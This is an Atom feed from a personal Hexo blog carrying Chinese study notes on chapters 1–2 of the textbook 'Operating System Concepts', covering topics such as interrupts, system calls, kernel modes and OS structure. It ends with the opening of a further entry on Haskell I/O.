<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Forec&#39;s Notes</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://forec.github.io/"/>
  <updated>2016-11-22T08:01:49.143Z</updated>
  <id>http://forec.github.io/</id>
  
  <author>
    <name>Forec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>操作系统概念（一）</title>
    <link href="http://forec.github.io/2016/11/22/os-concepts-1/"/>
    <id>http://forec.github.io/2016/11/22/os-concepts-1/</id>
    <published>2016-11-22T02:07:44.000Z</published>
    <updated>2016-11-22T08:01:49.143Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;整理《Operating System Concepts》 第七版前两章的理论和概念，内容均为原书的摘录，由我按个人理解简化、翻译为中文，可能存在一些不准确之处。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;绪论（第一章）&quot;&gt;&lt;a href=&quot;#绪论（第一章）&quot; class=&quot;headerlink&quot; title=&quot;绪论（第一章）&quot;&gt;&lt;/a&gt;绪论（第一章）&lt;/h1&gt;&lt;h2 id=&quot;定义操作系统&quot;&gt;&lt;a href=&quot;#定义操作系统&quot; class=&quot;headerlink&quot; title=&quot;定义操作系统&quot;&gt;&lt;/a&gt;定义操作系统&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;操作系统（operating system）&lt;/strong&gt; 是管理计算机硬件的一个程序，它同时作为用户和硬件的中间层，为应用程序提供了基础。&lt;/li&gt;
&lt;li&gt;一个计算机系统可被大致划分为四个部件： &lt;em&gt;硬件（hardware）&lt;/em&gt; 、 &lt;em&gt;操作系统&lt;/em&gt; 、 &lt;em&gt;应用程序（application programs）&lt;/em&gt; 、 &lt;em&gt;用户（users）&lt;/em&gt; 。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;硬件（hardware）&lt;/strong&gt; 包括： &lt;strong&gt;中央处理器（central processing unit）&lt;/strong&gt; 、 &lt;strong&gt;存储器（memory）&lt;/strong&gt; 和 &lt;strong&gt;输入输出（I/O）设备&lt;/strong&gt; 。操作系统控制并协调多个用户的多道程序。&lt;/li&gt;
&lt;li&gt;从计算机的视角看，操作系统类似一个 &lt;strong&gt;资源管理器（resource allocator）&lt;/strong&gt; ，它扮演了硬件资源管理者的角色。另一个略微有所不同的角度是，操作系统是一个控制程序，这个 &lt;strong&gt;控制程序（control program）&lt;/strong&gt; 管理用户程序的执行以防止错误的发生和对计算机不合法的使用。&lt;/li&gt;
&lt;li&gt;计算机系统最基本的目的是执行用户程序，并让用户问题的解决变得更容易。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;操作系统组织&quot;&gt;&lt;a href=&quot;#操作系统组织&quot; class=&quot;headerlink&quot; title=&quot;操作系统组织&quot;&gt;&lt;/a&gt;操作系统组织&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;计算机用于启动的初始化程序被称作 &lt;strong&gt;引导程序（bootstrap program）&lt;/strong&gt; ，它被存储在只读存储器（ROM）或电擦除只读存储器（EEPROM），也就是常说的固件。&lt;/li&gt;
&lt;li&gt;一个事件的发生通常通过硬件或软件的 &lt;strong&gt;中断（interrupt）&lt;/strong&gt; 来触发。硬件可能在任何时候通过向 CPU 发送一个信号来 &lt;strong&gt;触发（trigger）&lt;/strong&gt; 中断，该信号通常经由总线传递。软件可能通过执行被称作 &lt;strong&gt;系统调用（system call）&lt;/strong&gt; 的特殊指令来触发中断。&lt;/li&gt;
&lt;li&gt;计算机程序必须在主存（也被称作 &lt;strong&gt;随机访问存储器（random-access memory）&lt;/strong&gt; ）中执行。主存是 CPU 能直接访问的唯一的大容量存储，它通常由被称作 &lt;strong&gt;动态随机访问存储器（dynamic random-access memory，DRAM）&lt;/strong&gt; 的半导体器件实现。主存是 &lt;em&gt;易失（volatile）&lt;/em&gt; 存储，当电源关闭或其它问题出现时，其内容会丢失。因此多数计算机系统提供了 &lt;strong&gt;二级存储（secondary storage）&lt;/strong&gt; 作为主存的扩展，二级存储设备通常是 &lt;strong&gt;磁盘（magnetic disk）&lt;/strong&gt; 。&lt;/li&gt;
&lt;li&gt;操作系统对每一个设备控制器均设置有一个 &lt;strong&gt;设备驱动（device driver）&lt;/strong&gt; ，要启动一个 I/O 操作需经过如下步骤：&lt;ul&gt;
&lt;li&gt;设备驱动设置设备控制器内部对应的寄存器&lt;/li&gt;
&lt;li&gt;设备控制器检查其内部寄存器并确定要执行的行为&lt;/li&gt;
&lt;li&gt;设备控制器启动数据传输，数据 &lt;strong&gt;从设备发送给本地缓存&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;一旦数据传输结束，设备控制器通过触发一个中断通知设备驱动&lt;/li&gt;
&lt;li&gt;设备驱动将控制权交还给操作系统；如果 I/O 操作是读行为，则携带读取的数据或者指向数据的指针；如果 I/O 操作是其他行为，则返回状态信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大量数据移动通常使用 &lt;strong&gt;直接存储器访问（direct memory access，DMA）&lt;/strong&gt; 。在为 I/O 设备设置缓冲区、指针、计数器后，设备控制器将整块数据直接从它的缓冲区发送到主存（或相反方向）而不经过 CPU。传输一块数据只会触发一次 CPU 中断。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;计算机系统体系与结构&quot;&gt;&lt;a href=&quot;#计算机系统体系与结构&quot; class=&quot;headerlink&quot; title=&quot;计算机系统体系与结构&quot;&gt;&lt;/a&gt;计算机系统体系与结构&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多处理器系统（multiprocessor system）&lt;/strong&gt; ，也被称作 &lt;strong&gt;并行系统（parallel system）&lt;/strong&gt; 或 &lt;strong&gt;轻耦合系统（lightly coupled system）&lt;/strong&gt; 有以下三个主要优点：&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;增加吞吐量（throughput）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;性价比高&lt;/strong&gt; ：相比多个单处理器系统，因为多处理器系统可以共享 &lt;strong&gt;外围设备（peripherals）&lt;/strong&gt; 、 &lt;strong&gt;大容量存储器（mass storage）&lt;/strong&gt; 和电源，因此花费更少。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;增加可靠性（reliability）&lt;/strong&gt; ：单处理器出现故障只会减缓系统而不会导致系统终止。根据存活硬件均衡提供服务的能力被称作 &lt;strong&gt;故障弱化（graceful degradation）&lt;/strong&gt; 。有些系统具有 &lt;strong&gt;容错能力（fault tolerant）&lt;/strong&gt; ，当任何一个单件出错时，系统能够继续运行。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;多处理器系统主要有两种类型：&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;非对称多处理器（asymmetric multiprocessing）&lt;/strong&gt; ：每个处理器被赋予一定特殊作业，一个主处理器用于控制系统，其它的处理器要么从主处理器获取信息，要么执行预定义的作业。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对称多处理器（symmetric multiprocessing，SMP）&lt;/strong&gt; ：每个处理器均可执行操作系统中的所有作业，处理器之间不存在主从关系。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多道程序（multiprogramming）&lt;/strong&gt; 通过组织作业（代码或数据）增加了 CPU 的利用率（utilization），CPU 无论何时均有一个作业在执行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分时（time sharing）&lt;/strong&gt; ，或者 &lt;strong&gt;多工（multitasking）&lt;/strong&gt; 是多道程序在逻辑上的扩展，CPU 在多个程序间跳转执行，因为跳转速度很快，对于用户而言就可以与各个同时运行的程序交互。 分时需要 &lt;strong&gt;交互式（interactive）&lt;/strong&gt; 的计算机系统，用户和系统之间应该可以直接交流，且 &lt;strong&gt;响应时间（response time）&lt;/strong&gt; 应当足够短。&lt;/li&gt;
&lt;li&gt;一个被装入主存并执行的程序被称作 &lt;strong&gt;进程（process）&lt;/strong&gt; 。分时和多道程序需要主存中同时保持多个作业，因为主存通常不足以同时容纳这些作业，所以它们在执行前被存放在硬盘的 &lt;strong&gt;作业池（job pool）&lt;/strong&gt; 中，它容纳了所有等待分配主存的进程。&lt;/li&gt;
&lt;li&gt;如果多个作业因为主存空间不足而无法同时装载，那么系统要在作业间进行 &lt;strong&gt;作业调度（job scheduling）&lt;/strong&gt; 。&lt;/li&gt;
&lt;li&gt;在分时系统中，操作系统必须保证响应时间，这一点有时通过进程在主存和硬盘之间的 &lt;strong&gt;交换（swapping）&lt;/strong&gt; 完成。一个更普遍的方式是 &lt;strong&gt;虚拟内存（virtual memory）&lt;/strong&gt; ，它使用户可以运行远大于 &lt;strong&gt;物理内存（physical memory）&lt;/strong&gt; 的程序。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;操作系统运行&quot;&gt;&lt;a href=&quot;#操作系统运行&quot; class=&quot;headerlink&quot; title=&quot;操作系统运行&quot;&gt;&lt;/a&gt;操作系统运行&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;现代操作系统均为 &lt;strong&gt;中断驱动（interrupt driven）&lt;/strong&gt; ，事件几乎都通过中断或陷阱来触发。&lt;/li&gt;
&lt;li&gt;一个 &lt;strong&gt;陷阱（trap）&lt;/strong&gt; 或者说 &lt;strong&gt;异常（exception）&lt;/strong&gt; ，是软件产生的中断。触发的原因要么是错误的产生（例如除 0 操作或为例内存访问），要么是用户程序执行了对操作系统服务的特殊请求。&lt;/li&gt;
&lt;li&gt;为了保证操作系统程序正确执行，我们需要区分系统程序段和用户程序段。因此设置了两个独立的操作 &lt;strong&gt;模式（modes）&lt;/strong&gt; ： &lt;strong&gt;用户模式（user mode）&lt;/strong&gt; 和 &lt;strong&gt;内核/管理/系统/特权模式（kernel/supervisor/system/privileged mode）&lt;/strong&gt; 。计算机硬件中需要加入一个 &lt;strong&gt;模式位（mode bit）&lt;/strong&gt; 用于说明当前的模式为内核（0）还是用户（1）。&lt;/li&gt;
&lt;li&gt;在系统启动时，硬件系统处于内核模式。之后操作系统被加载并且在用户模式中执行用户应用。当一个陷阱或者中断发生，硬件将从用户模式切换到内核模式。&lt;/li&gt;
&lt;li&gt;我们将一些机器指令指定为可能产生有害作用的 &lt;strong&gt;特权指令（privileged instructions）&lt;/strong&gt; ，硬件只允许特权指令在内核模式中运行。一旦系统调用被执行，它将被硬件视为一个软中断，中断向量将被传递给系统内部的一个服务程序，并且模式位切换至内核模式。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;定时器（timer）&lt;/strong&gt; 可使计算机在一定时间后被中断。在将控制权交还给用户之前，操作系统必须保证定时器已被设置，一旦定时器触发中断，控制权将自动交还给操作系统，操作系统会将该中断视作一个致命的错误（fatal error）或者给这个程序更多的执行时间。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;进程管理&quot;&gt;&lt;a href=&quot;#进程管理&quot; class=&quot;headerlink&quot; title=&quot;进程管理&quot;&gt;&lt;/a&gt;进程管理&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;程序是被动的实体，而进程是主动（active）的实体。&lt;/li&gt;
&lt;li&gt;一个进程要完成任务需要如下资源：CPU，存储器，文件和 I/O 设备。一个单线程的进程有一个 &lt;strong&gt;程序计数器（program counter）&lt;/strong&gt; 指定下一条要执行的指令，多线程的进程有多个程序计数器。&lt;/li&gt;
&lt;li&gt;进程是系统中的工作单元。通过在单 CPU 的复用，所有的进程都有机会并行执行。&lt;/li&gt;
&lt;li&gt;操作系统需要对进程管理及以下相关行为负责：&lt;ul&gt;
&lt;li&gt;创建或删除用户或系统进程&lt;/li&gt;
&lt;li&gt;挂起或继续进程&lt;/li&gt;
&lt;li&gt;为进程同步提供机制&lt;/li&gt;
&lt;li&gt;为进程通信提供机制&lt;/li&gt;
&lt;li&gt;为死锁的处理提供机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;操作系统结构（第二章）&quot;&gt;&lt;a href=&quot;#操作系统结构（第二章）&quot; class=&quot;headerlink&quot; title=&quot;操作系统结构（第二章）&quot;&gt;&lt;/a&gt;操作系统结构（第二章）&lt;/h1&gt;&lt;h2 id=&quot;操作系统服务&quot;&gt;&lt;a href=&quot;#操作系统服务&quot; class=&quot;headerlink&quot; title=&quot;操作系统服务&quot;&gt;&lt;/a&gt;操作系统服务&lt;/h2&gt;&lt;p&gt;操作系统应提供如下服务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;用户接口（user interface）&lt;/strong&gt; ，包括：&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;命令行接口（command-line interface，CLI）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;批处理接口（batch interface）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;图形化用户接口（graphical user interface，GUI）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;程序执行（program execution）&lt;/strong&gt; ：操作系统要能够将程序加载到主存并执行程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;输入/输出操作（I/O operations）&lt;/strong&gt; ：运行中的程序可能需要涉及到文件或 I/O 设备的读写操作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件系统控制（file-system manipulation）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;通信（communications）&lt;/strong&gt; ：通信可能通过 &lt;em&gt;共享内存（shared memory）&lt;/em&gt; 或 &lt;em&gt;消息传递（message passing）&lt;/em&gt; 实现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;错误检测（error detection）&lt;/strong&gt; ：操作系统应当能始终检测到可能的错误&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源分配（resource allocation）&lt;/strong&gt; ：一些资源需要特殊的分配行为（如 CPU、主存和文件存储），有的还需要请求和释放代码（如 I/O 设备）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;统计（accounting）&lt;/strong&gt; ：操作系统需要对每个用户使用了多少不同的计算机资源做统计&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全防护（protection and security）&lt;/strong&gt; ：保证所有对系统资源的请求都得以控制&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;用户接口和系统调用&quot;&gt;&lt;a href=&quot;#用户接口和系统调用&quot; class=&quot;headerlink&quot; title=&quot;用户接口和系统调用&quot;&gt;&lt;/a&gt;用户接口和系统调用&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;有的操作系统将命令解释器（command interpreter）作为系统内核的一部分，有的（如 Windows XP 和 UNIX）将命令解释器作为一个特殊的程序。在存在多个可选命令解释器的系统中，它们通常被称作 &lt;strong&gt;壳（shell）&lt;/strong&gt; 。命令解释器的主要功能是获取并执行下一条用户指定的指令，有两种执行的方式：&lt;ul&gt;
&lt;li&gt;命令解释器本身包含了执行命令的代码：可执行命令的数量决定了命令解释器的大小&lt;/li&gt;
&lt;li&gt;通过系统程序实现多数指令：命令解释器本身并不理解指令的含义，它仅仅通过命令指定一个文件，将其装载至主存并执行。例如 &lt;code&gt;rm file.txt&lt;/code&gt; 将程序 &lt;code&gt;rm&lt;/code&gt; 加载并传入参数 &lt;code&gt;file.txt&lt;/code&gt; 执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;图形用户接口提供了一个桌面。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统调用（system call）&lt;/strong&gt; 为系统服务提供了一个接口。多数程序开发者并不接触这一细节等级的代码，他们通常使用 &lt;strong&gt;应用程序接口（application programming interface，API）&lt;/strong&gt; 来编写程序。API 为应用程序开发者提供了一组函数，最常见的三组 API 如：Windows 系统的 Win32 API、基于 POSIX 系统的 POSIX API 和 Java API。使用 API 的背后实际涉及了系统调用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统调用和中断的异同点&lt;/strong&gt; ：&lt;ul&gt;
&lt;li&gt;二者均有索引（系统调用编号-系统调用表、中断向量表），二者的执行均需切换到内核模式&lt;/li&gt;
&lt;li&gt;二者触发条件不同：系统调用是主动请求（会被硬件视为软中断），中断是外部触发&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中断和陷阱的不同点&lt;/strong&gt; ：&lt;ul&gt;
&lt;li&gt;二者起点不同：陷阱是正在执行的程序主动发起的，中断是外部错误或动作产生&lt;/li&gt;
&lt;li&gt;二者处理方式不同：程序的陷阱（异常）在响应后将停止执行，而程序在中断时保存断点，中断处理结束后从断点恢复执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;多数程序设计语言的运行时支持系统（一系列包含在编译器链接库中的函数）提供了 &lt;strong&gt;系统调用接口（system-call interface）&lt;/strong&gt; ，它们将程序代码和操作系统提供的系统调用链接起来。每个系统调用都有一个对应的编号，系统调用接口维护了一个编号-系统调用的索引，它们截取应用程序调用的 API，调用操作系统内核中相关的系统调用，并返回系统调用状态及其他返回值。&lt;/li&gt;
&lt;li&gt;向操作系统传递参数有三种方法：通过寄存器传递、内存的块/表、压入/弹出堆栈。&lt;/li&gt;
&lt;li&gt;系统调用可被大致分为五类： &lt;strong&gt;进程控制（process control）&lt;/strong&gt; 、 &lt;strong&gt;文件管理（file manipulation）&lt;/strong&gt; 、 &lt;strong&gt;设备管理（device manipulation）&lt;/strong&gt; 、 &lt;strong&gt;信息维护（information maintenance）&lt;/strong&gt; 和 &lt;strong&gt;通信（communications）&lt;/strong&gt; 。&lt;/li&gt;
&lt;li&gt;一个单任务系统： MS-DOS，它在计算机启动时运行一个命令解释器，当运行程序时，它将程序装入内存，并修改命令解释器的大部分内容来为新程序提供尽可能多的空间。之后将指令指针设为程序的第一条指令并运行程序，要么产生错误引起中断（此错误代码会被保存），要么程序执行一个系统调用以终止。最终命令解释器剩余部分程序继续执行，并从磁盘重新装入命令解释器的其他部分。这些步骤完成后，命令解释器会想用户/下一程序提供上一次运行的结果（保存的错误代码）。&lt;/li&gt;
&lt;li&gt;多任务系统：FreeBSD，用户登录到系统时，从用户选择的 Shell 开始执行。为了启动新进程，Shell 执行 &lt;code&gt;fork()&lt;/code&gt; 系统调用，所选择的程序通过 &lt;code&gt;exec()&lt;/code&gt; 装入内存并执行。根据命令发布方式，Shell 要么等待进程结束，要么在后台执行进程并继续响应用户输入。&lt;/li&gt;
&lt;li&gt;两种通信模型：&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;消息传递模型（message-passing model）&lt;/strong&gt; ：通信进程通过彼此之间交换消息传递信息，直接/间接通过一个共同的邮箱。通信实体可能是同一主机的不同进程，也可能是通过网络相连的另一主机的进程。进程之间通过 &lt;strong&gt;主机名（host name）&lt;/strong&gt; 和 &lt;strong&gt;进程名（process name）&lt;/strong&gt; 作为标识符区分。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;共享内存模型（shared-memory model）&lt;/strong&gt; ：进程使用 &lt;code&gt;shared memory create&lt;/code&gt; 和 &lt;code&gt;shared memory attach&lt;/code&gt; 系统调用来获得其它进程所拥有内存区域的访问权。操作系统通常需要组织一个进程访问另一个进程的内存，要使用共享内存模型，需要两/多个进程都同意取消这一限制。数据的形式和位置由进程协商决定，不受操作系统控制，进程必须保证它们不会同时向同一地方写入。&lt;/li&gt;
&lt;li&gt;区别：消息传递对交换少量数据更有效，对于计算机之间的通信也比共享内存更容易实现；共享内存允许最大速度通信（本地可以内存速度），并且比较方便，但需要保护和同步。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;操作系统设计和实现&quot;&gt;&lt;a href=&quot;#操作系统设计和实现&quot; class=&quot;headerlink&quot; title=&quot;操作系统设计和实现&quot;&gt;&lt;/a&gt;操作系统设计和实现&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统程序（system program）&lt;/strong&gt; 为开发程序和执行程序提供了一个方便的环境，它们可分为：&lt;ul&gt;
&lt;li&gt;文件管理（file management）&lt;/li&gt;
&lt;li&gt;状态信息（status information）&lt;/li&gt;
&lt;li&gt;文件修改（file modification）&lt;/li&gt;
&lt;li&gt;程序语言支持（programming-language support）&lt;/li&gt;
&lt;li&gt;程序装入和执行（program loading and execution）&lt;/li&gt;
&lt;li&gt;通信（communications）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作系统设计目标：分为 &lt;em&gt;用户&lt;/em&gt; 目标 和 &lt;em&gt;系统&lt;/em&gt; 目标&lt;ul&gt;
&lt;li&gt;用户目标：系统应当方便、容易使用、容易学习、可靠、安全、快速&lt;/li&gt;
&lt;li&gt;系统目标：操作系统应该容易设计、实现和维护，应该灵活、可靠、高效而没有错误&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;策略（policy）&lt;/strong&gt; 和 &lt;strong&gt;机制（mechanism）&lt;/strong&gt; 的区分：机制决定如何做（ &lt;em&gt;how&lt;/em&gt; to do），而策略决定做什么（ &lt;em&gt;what&lt;/em&gt; will be done）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;操作系统结构&quot;&gt;&lt;a href=&quot;#操作系统结构&quot; class=&quot;headerlink&quot; title=&quot;操作系统结构&quot;&gt;&lt;/a&gt;操作系统结构&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;简单结构：利用最小的空间提供最多的功能，没有被划分为模块，如 MS-DOS。应用程序能够访问最底层的、基本的设备驱动，因此易受恶意程序的伤害。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分层方法（Layered Approach）&lt;/strong&gt; ：采用自顶向下方法，将总的功能和特征划分为模块。模块化的其中方法是分层方法：将操作系统分为若干层（级），最底层（层0）为硬件，最高层（层N）为用户接口，分层结构类似一个同心圆。分层法最大的 &lt;strong&gt;优点在于构造和调试的简单化&lt;/strong&gt; （每层只能利用较低层的功能和服务、每层为高层隐藏了一定数据结构、操作和硬件存在），主要困难在于 &lt;strong&gt;对层的详细定义&lt;/strong&gt; 和 &lt;strong&gt;相比其他方法的低效&lt;/strong&gt; 。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;微内核（microkernels）&lt;/strong&gt; ：将操作系统中所有非基本部分从内核中移走，将它们实现为系统程序或用户程序，从而得到更小的内核。微内核通常包括最小的进程、内存管理和通信功能。&lt;ul&gt;
&lt;li&gt;微内核的主要功能是使客户程序和运行在用户空间的各种服务之间通信，客户程序和服务之间不会直接交互，而是通过微内核的 &lt;strong&gt;消息传递&lt;/strong&gt; 。&lt;/li&gt;
&lt;li&gt;因为新服务可在用户空间增加而不需修改内核，因此 &lt;strong&gt;便于扩充操作系统&lt;/strong&gt; ；因为大多数服务作为用户而不是内核进程运行，因此提供了 &lt;strong&gt;更好的安全性和可靠性&lt;/strong&gt; 。&lt;/li&gt;
&lt;li&gt;因为使用消息传递，系统功能总开销增加，因此 &lt;strong&gt;系统性能下降&lt;/strong&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模块（modules）&lt;/strong&gt; ：用面向对象技术生成模块化的内核，动态加载模块。内核可以提供核心服务，也可动态实现特定功能。该方法和微内核方法类似，核心模块只有核心功能以及其他模块加载、通信的相关信息，但模块方法中， &lt;strong&gt;模块之间不需要调用消息传递来通信&lt;/strong&gt; 。&lt;/li&gt;
&lt;li&gt;示例：Mac OS X操作系统的结构，底层为 Mach 微内核，提供内存管理、远程程序调用（remote process call，RPC）和进程间通信（IPC）工具；BSD 提供 BSD 命令行接口，支持网络、文件系统、POSIX API 实现。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;虚拟机和系统生成&quot;&gt;&lt;a href=&quot;#虚拟机和系统生成&quot; class=&quot;headerlink&quot; title=&quot;虚拟机和系统生成&quot;&gt;&lt;/a&gt;虚拟机和系统生成&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;虚拟机的基本思想是单个计算机（CPU、内存、硬盘、网卡等）硬件抽象为几个不同的执行部件。&lt;/li&gt;
&lt;li&gt;虚拟机除了提供与基本硬件相同的接口外，不提供额外功能。每个进程都有一个与底层机器完全相同的（虚拟）副本。&lt;/li&gt;
&lt;li&gt;虚拟机为每个虚拟系统提供 &lt;strong&gt;小型磁盘（minidisk）&lt;/strong&gt; ，系统在物理磁盘上为小型磁盘分配所需要的磁道来实现。所有小型磁盘的大小之和必须小于可用的物理磁盘。&lt;/li&gt;
&lt;li&gt;底层物理机器有两种模式：用户模式和内核模式，虚拟机软件本身在物理机器上运行在用户模式中，而虚拟机在虚拟系统中运行在内核模式，每个虚拟系统有虚拟用户模式和虚拟内核模式，这两种模式均运行在物理用户模式。&lt;/li&gt;
&lt;li&gt;虚拟的 I/O 操作可能需要更少（脱机操作）或更多（解释执行）的时间。&lt;/li&gt;
&lt;li&gt;优点：可用于研究、开发操作系统；不同系统资源具有完全的保护，各个虚拟机之间完全独立。&lt;/li&gt;
&lt;li&gt;操作系统通常设计成能运行在一类计算机上，对于某类特定的计算机场所，配置生成系统的过程称为 &lt;strong&gt;系统生成（system generation，SYSGEN）&lt;/strong&gt; 。需要考虑的信息有：使用什么CPU、多少可用内存、哪些可用设备、需要什么操作系统选项和参数值。这些信息确定后，系统管理员可用这些信息修改操作系统的源代码副本以完全重新编译操作系统；或者创建一个表，从预先编译过的库中选取模块，将这些模块连接起来生成操作系统；或者构造一个完全由表驱动的系统，所有代码都是系统的组成部分， &lt;strong&gt;选择发生在执行时而不是编译时&lt;/strong&gt; ，现代多数操作系统均为此种方式。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;系统引导&quot;&gt;&lt;a href=&quot;#系统引导&quot; class=&quot;headerlink&quot; title=&quot;系统引导&quot;&gt;&lt;/a&gt;系统引导&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;装入内核以启动计算机的过程称为 &lt;strong&gt;引导（booting）&lt;/strong&gt; 系统，多数计算机中均有一小块代码，称为 &lt;strong&gt;引导程序（bootstrap program）&lt;/strong&gt; 或 &lt;strong&gt;引导装载程序（bootstrap loader）&lt;/strong&gt; ，这段代码将定位内核，将其装入内存并开始执行。引导程序被存放在只读存储器中。&lt;/li&gt;
&lt;li&gt;对于大型操作系统（多数通用操作系统），引导程序存储在固件中，操作系统保存在磁盘上。引导程序运行诊断程序，从磁盘固定位置（0区块）读取整个引导块到内存，并执行这个 &lt;strong&gt;引导块（boot block）&lt;/strong&gt; 中的代码。这个引导块足够复杂，它将一个完整的操作系统装载到内存开始执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;专栏目录：&lt;a href=&quot;http://blog.forec.cn/columns/cs-basic.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;计算机理论基础&lt;/a&gt;&lt;br&gt;此专栏的上一篇文章：&lt;a href=&quot;http://blog.forec.cn/2015/11/14/Computer-Organization-Architectur6/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;计组与体系结构笔记：输入/输出与存储系统&lt;/a&gt;&lt;br&gt;此专栏的下一篇文章：&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne&lt;/p&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/22/os-concepts-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/22/os-concepts-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/22/os-concepts-1/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;整理《Operating System Concepts》 第七版前两章的理论和概念，内容均为原书的摘录，由我按个人理解简化、翻译为中文，可能存在一些不准确之处。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="计算机理论基础" scheme="http://forec.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="OS" scheme="http://forec.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>Haskell 中的非纯粹行为</title>
    <link href="http://forec.github.io/2016/11/21/haskell-io-actions/"/>
    <id>http://forec.github.io/2016/11/21/haskell-io-actions/</id>
    <published>2016-11-21T01:03:07.000Z</published>
    <updated>2016-11-21T16:26:00.289Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;整理 Haskell 中的 I/O 行为和性质，包括惰性 I/O、异常、临时文件、缓冲等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
